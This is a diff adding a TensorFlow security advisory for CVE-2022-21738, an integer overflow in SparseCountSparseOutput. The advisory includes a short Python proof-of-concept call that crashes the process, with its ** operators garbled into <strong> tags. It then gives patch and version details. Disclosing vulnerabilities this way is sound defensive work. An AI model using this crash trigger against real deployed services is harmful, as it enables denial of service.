@@ -1,0 +1,25 @@
+<h2>TFSA-2022-019: Integer overflow leading to crash in <code>SparseCountSparseOutput</code></h2>
+<h3>CVE Number</h3>
+<p>CVE-2022-21738</p>
+<h3>Impact</h3>
+<p>The <a href="https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/count_ops.cc#L168-L273">implementation of <code>SparseCountSparseOutput</code></a> can be made to crash a TensorFlow process by an integer overflow whose result is then used in a memory allocation:</p>
+<p>```python
+import tensorflow as tf
+import numpy as np</p>
+<p>tf.raw_ops.SparseCountSparseOutput(
+  indices=[[1,1]],
+  values=[2],
+  dense_shape=[2 <strong> 31, 2 </strong> 32],
+  weights=[1],
+  binary_output=True,
+  minlength=-1,
+  maxlength=-1,
+  name=None)
+```</p>
+<h3>Patches</h3>
+<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/6f4d3e8139ec724dbbcb40505891c81dd1052c4a">6f4d3e8139ec724dbbcb40505891c81dd1052c4a</a>.</p>
+<p>The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.</p>
+<h3>For more information</h3>
+<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
+<h3>Attribution</h3>
+<p>This vulnerability has been reported by Faysal Hossain Shezan from University of Virginia.</p>
